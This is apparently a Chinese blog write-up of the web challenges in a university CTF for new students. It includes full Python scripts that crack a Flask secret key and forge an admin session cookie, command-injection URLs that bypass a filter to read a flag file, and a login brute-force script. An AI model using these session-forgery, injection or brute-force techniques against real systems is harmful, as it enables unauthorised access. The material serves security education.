---
title: SCUCTF2025 WriteUp For Web
published: 2025-12-22
description: 四川大学网络安全新生赛题解
image: ./covers/cover4.webp
tags: [网络安全, Web]
category: 网络安全
draft: false
---

## 题目解题过程

### Web-教务管理系统 解题步骤：

简简单单SQL注入
然后进入后台修改成绩，获得flag
![](image-9.png)
```flag{a74f0bf731c94271b43a7c6dcd14cf95}```

### Web-Cookies 解题步骤：
这是一道典型的 Flask Session 伪造
根据源代码，derived_level 函数决定了是否能获取flag
要成为superadmin，伪造Session，且满足两个条件：
1.role 必须是 "admin"
2.user 必须是 secret_key 的倒序字符串。、

安装```flask-unsign```工具
下载```rockyou```字典爆破```SECRET_KEY```
然后构造```payload```发送伪造的session访问```/admin```
编写脚本获取flag
```
import requests
import subprocess
import re
import sys
import os

TARGET_URL = "http://challenge.qsnctf.com:45436"
ADMIN_URL = f"{TARGET_URL}/admin"

def log(msg, type="+"):
    print(f"[{type}] {msg}")

def get_initial_session():
    """获取初始 Session Cookie"""
    resp = requests.get(TARGET_URL, timeout=10)
    cookie = resp.cookies.get('session')
    return cookie

def crack_key(cookie):
    """使用外部的大型字典文件进行爆破"""
    wordlist_path = "rockyou.txt" 

    log(f"正在使用外部字典 {wordlist_path} 爆破 SECRET_KEY...", "*")
    cmd = [
        "flask-unsign", "--unsign", 
        "--cookie", cookie, 
        "--wordlist", wordlist_path,
        "--no-literal-eval"
    ]
    process = subprocess.run(cmd, capture_output=True, text=True)
        
    output = process.stdout.strip()
    match = re.search(r"'(.*?)'", output)
    if match:
        key = match.group(1)
        log(f"爆破成功! SECRET_KEY: {key}")
        return key
    return output

def sign_admin_cookie(secret_key):
    """构造 Payload 并重新签名"""
    user_value = secret_key[::-1]
    payload = f"{{'role': 'admin', 'user': '{user_value}'}}"
    
    log(f"构造 Payload: {payload}", "*")

    cmd = [
        "flask-unsign", "--sign",
        "--cookie", payload,
        "--secret", secret_key
    ]
    process = subprocess.run(cmd, capture_output=True, text=True)
    forged_cookie = process.stdout.strip()
    return forged_cookie

def exploit(session_cookie):
    """发送 Payload 获取 Flag"""
    log("正在发送 Payload 获取 Flag...", "*")
    
    cookies = {'session': session_cookie}
    resp = requests.get(ADMIN_URL, cookies=cookies)
    flag_match = re.search(r'(qsnctf\{.*?\}|flag\{.*?\})', resp.text, re.IGNORECASE)
    log(f"最终结果: \033[92m{flag_match.group(1)}\033[0m", "+")

if __name__ == "__main__":
    sess = get_initial_session()
    key = crack_key(sess)
    evil_sess = sign_admin_cookie(key)
    exploit(evil_sess)
```
运行后解出flag

### Web-死亡PING命令 解题步骤：
分析代码，需要进行命令注入和关键词过滤绕过
![](image-10.png)
执行```http://challenge.qsnctf.com:45532/?ip=127.0.0.1;ls /```
得到
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.039 ms 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.100 ms 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.077 ms 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.080 ms --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.039/0.074/0.100 ms bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var
```
此时发现flag文件
执行```http://challenge.qsnctf.com:45532/?ip=127.0.0.1;cat /fl''ag```
返回内容中获得flag
```flag{876ebc5691104710a5232b9a3274985c}```

### Web-MiniGame 解题步骤

猜测得到用户名为```zhangsan```
根据题目提示编写脚本爆破密码
```
import requests
import datetime

url = "http://challenge.qsnctf.com:46025/login"
username = "zhangsan"
year = 1993

def attack():
    print(f"[*] 开始爆破用户 {username}，年份: {year} ...")
    
    start_date = datetime.date(year, 1, 1)
    end_date = datetime.date(year, 12, 31)
    delta = datetime.timedelta(days=1)
    
    current_date = start_date
    
    s = requests.Session()

    found = False

    while current_date <= end_date:
        date_str = current_date.strftime("%Y%m%d")
        password = f"{username}{date_str}"
        data = {
            "username": username,
            "password": password
        }
        
        try:
            response = s.post(url, data=data)
            if "密码错误" not in response.text:
                print(f"\n[+] !!! 爆破成功 !!!")
                print(f"[+] 正确密码: {password}")
                if "flag" in response.text.lower() or "qsnctf" in response.text.lower():
                    print("[+] 页面包含 Flag 信息，请查看下方内容:")
                    print("-" * 30)
                    print(response.text.strip()) 
                    print("-" * 30)
                else:
                    print("[+] 未直接发现 flag 关键字，可能是跳转了，请手动尝试该密码。")
                    print(f"[+] 状态码: {response.status_code}")
                
                found = True
                break
            if int(date_str) % 50 == 0:
                print(f"[-] 正在尝试: {password} ...")

        except Exception as e:
            print(f"[!] 请求异常: {e}")

        current_date += delta

    if not found:
        print("\n[-] 字典跑完了，未找到密码。")
        print("[-] 建议检查：1. 用户名是否正确？ 2. 密码格式是否为 zhangsan+YYYYMMDD？")

if __name__ == "__main__":
    attack()
```
爆破得到密码```zhangsan19930725```
登录进去与站长对话
![](image-23.png)
获得flag：```flag{b3af41867a30475683e5b4d0fad7a69d}```

